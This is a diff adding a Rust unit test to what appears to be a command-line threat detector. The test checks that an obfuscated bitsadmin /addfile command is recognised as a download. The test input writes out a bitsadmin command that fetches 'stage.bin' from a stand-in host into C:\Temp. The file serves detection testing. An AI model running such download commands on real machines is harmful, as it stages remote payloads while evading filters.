@@ -6556,6 +6556,22 @@ mod bitsadmin_tests {
         });
         assert!(has, "no BitsadminDownload: {:?}", env.traits);
     }
+
+    #[test]
+    fn bitsadmin_addfile_emits_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"bitsadmin /create myjob & bitsadmin /addfile myjob "hTtPs:\\bits-addfile.example\stage.bin" "C:\Temp\stage.bin""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-addfile.example/stage.bin" && dst == "C:\\Temp\\stage.bin"
+            )
+        });
+        assert!(has, "no /addfile BitsadminDownload: {:?}", env.traits);
+    }
 }
 
 #[cfg(test)]
